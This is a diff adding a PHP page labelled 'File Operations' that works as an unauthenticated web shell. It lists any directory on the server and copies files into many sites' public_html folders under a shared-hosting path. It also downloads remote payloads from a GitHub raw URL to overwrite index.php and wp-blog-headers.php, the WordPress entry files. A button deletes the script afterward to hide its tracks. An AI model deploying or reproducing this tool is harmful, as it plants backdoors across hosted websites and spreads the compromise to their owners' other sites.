@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>File Operations</title>
+</head>
+<body>
+    <h2>File Operations</h2>
+
+    <!-- Display current directory path -->
+    <?php
+    $current_directory = getcwd(); // Get current working directory path
+    echo '<p><strong>Current Directory:</strong> ' . htmlspecialchars($current_directory) . '</p>';
+    ?>
+    <p>index.php</p>
+    <p>wp-blog-headers.php</p>
+
+    <!-- List Directory Contents -->
+    <h3>List Directory Contents</h3>
+    <form method="post">
+        <label for="listDirPath">Directory Path:</label>
+        <input type="text" id="listDirPath" name="listDirPath" required>
+        <button type="submit" name="listSubmit">List Contents</button>
+    </form>
+
+    <?php
+    // Handle form submission for listing directory contents
+    if (isset($_POST['listSubmit'])) {
+        $listDirPath = $_POST['listDirPath'];
+
+        // Validate and list directory contents
+        if (!empty($listDirPath) && is_dir($listDirPath)) {
+            echo '<h4>Contents of Directory: ' . htmlspecialchars($listDirPath) . '</h4>';
+            echo '<ul>';
+
+            $directoryContents = scandir($listDirPath);
+            foreach ($directoryContents as $item) {
+                if ($item !== '.' && $item !== '..') {
+                    echo '<li>' . htmlspecialchars($item) . '</li>';
+                }
+            }
+
+            echo '</ul>';
+        } else {
+            echo '<p style="color: red;">Invalid directory path or directory does not exist.</p>';
+        }
+    }
+    ?>
+
+    <hr>
+
+    <!-- File Copy Form -->
+    <h3>File Copy</h3>
+    <form method="post">
+        <label for="source_files">Source File Paths (one per line):</label><br>
+        <textarea id="source_files" name="source_files" rows="5" required></textarea><br><br>
+        <label for="prefix">Prefix Directory Path: (/home/u18950000/domains)</label><br>
+        <input type="text" id="prefix" name="prefix" required><br><br>
+        <label for="suffix">Suffix Directory Path: public_html/</label><br>
+        <input type="text" id="suffix" name="suffix"><br><br>
+        <label for="directories">Middle Directory Names (one per line):</label><br>
+        <textarea id="directories" name="directories" rows="5" required></textarea><br><br>
+
+        <button type="submit" name="copy_files">Copy Files</button>
+    </form>
+
+    <?php
+    // Handle file copying
+    if (isset($_POST['copy_files'])) {
+        $source_files_input = $_POST['source_files'];
+        $prefix = rtrim($_POST['prefix'], DIRECTORY_SEPARATOR);
+        $suffix = isset($_POST['suffix']) ? rtrim($_POST['suffix'], DIRECTORY_SEPARATOR) : '';
+        $directories_input = $_POST['directories'];
+
+        // Validate input
+        if (!empty($source_files_input) && !empty($prefix) && !empty($directories_input)) {
+            $source_files = array_map('trim', explode("\n", $source_files_input));
+            $directories = array_map('trim', explode("\n", $directories_input));
+
+            foreach ($directories as $directory) {
+                // Skip empty lines
+                if (empty($directory)) {
+                    continue;
+                }
+
+                // Construct destination directory path
+                $destination_dir = $prefix . DIRECTORY_SEPARATOR . $directory;
+                if (!empty($suffix)) {
+                    $destination_dir .= DIRECTORY_SEPARATOR . $suffix;
+                }
+
+                foreach ($source_files as $source_file) {
+                    // Skip empty lines
+                    if (empty($source_file)) {
+                        continue;
+                    }
+
+                    // Construct destination path
+                    $filename = basename($source_file);
+                    $destination_path = $destination_dir . DIRECTORY_SEPARATOR . $filename;
+
+                    // Copy the file
+                    if (copy($source_file, $destination_path)) {
+                        echo '<p style="color: green;">File copied successfully to: ' . htmlspecialchars($destination_path) . '</p>';
+                    } else {
+                        echo '<p style="color: red;">Error copying file to: ' . htmlspecialchars($destination_path) . '</p>';
+                    }
+                }
+            }
+        } else {
+            echo '<p style="color: red;">Please provide all required input fields.</p>';
+        }
+    }
+    ?>
+
+    <hr>
+
+    <!-- Create Files Form -->
+    <h3>Create Files</h3>
+    <form method="post">
+        <button type="submit" name="create_index">Create index.php</button>
+        <button type="submit" name="create_wp_blog_headers">Create wp-blog-headers.php</button>
+    </form>
+
+    <?php
+    function fetch_and_save_file($url, $destination) {
+        // Use file_get_contents to fetch the content from the URL
+        $content = file_get_contents($url);
+
+        // Check if the content was fetched successfully
+        if ($content === false) {
+            return "Error: Unable to fetch content from $url.";
+        }
+
+        // Use file_put_contents to save the content to the destination file
+        $result = file_put_contents($destination, $content);
+
+        // Check if the content was saved successfully
+        if ($result === false) {
+            return "Error: Unable to save content to $destination.";
+        }
+
+        return "Content successfully saved to $destination.";
+    }
+
+    if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+        if (isset($_POST['create_index'])) {
+            $index_url = "https://raw.githubusercontent.com/zionrock313/zed/main/index.txt";
+            $index_destination = "index.php";
+            echo fetch_and_save_file($index_url, $index_destination);
+        }
+
+        if (isset($_POST['create_wp_blog_headers'])) {
+            $wp_blog_headers_url = "https://raw.githubusercontent.com/zionrock313/zed/main/blog.txt";
+            $wp_blog_headers_destination = "wp-blog-headers.php";
+            echo fetch_and_save_file($wp_blog_headers_url, $wp_blog_headers_destination);
+        }
+
+        if (isset($_POST['delete_script'])) {
+            // Get script filename
+            $script_filename = __FILE__;
+
+            // Attempt to delete the script file
+            if (unlink($script_filename)) {
+                echo '<p style="color: green;">Script file deleted successfully.</p>';
+            } else {
+                echo '<p style="color: red;">Error deleting script file.</p>';
+            }
+        }
+    }
+    ?>
+
+    <hr>
+
+    <!-- Delete Script Form -->
+    <h3>Delete Script</h3>
+    <form method="post">
+        <button type="submit" name="delete_script" onclick="return confirm('Are you sure you want to delete this script? This action cannot be undone.');">Delete Script</button>
+    </form>
+</body>
+</html>
